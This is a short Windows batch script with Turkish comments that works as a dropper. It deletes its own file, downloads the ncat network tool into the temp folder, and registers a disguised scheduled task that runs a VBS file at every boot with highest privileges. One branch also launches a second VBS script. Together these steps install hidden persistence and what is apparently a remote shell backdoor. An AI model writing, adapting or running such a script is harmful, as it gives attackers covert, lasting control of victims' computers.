@echo off
setlocal

REM Görevi kontrol et
schtasks /query /tn "TempVBS_OnBoot" >nul 2>&1

if %errorlevel% neq 0 (
    REM Görev YOKSA
    del /f /q "asd.bat"
    cd /d %temp%
    curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
    schtasks /create /tn "TempVBS_OnBoot" /tr "%temp%\e.vbs" /sc onstart /f /rl HIGHEST
    start "" "%temp%\rb.vbs"
) else (
    REM Görev VARSA
    del /f /q "asd.bat"
    cd /d %temp%
    curl -L https://github.com/cyberisltd/NcatPortable/raw/refs/heads/master/ncat.exe -o ncat.exe
    schtasks /create /tn "TempVBS_OnBoot" /tr "%temp%\e.vbs" /sc onstart /f /rl HIGHEST
)

endlocal
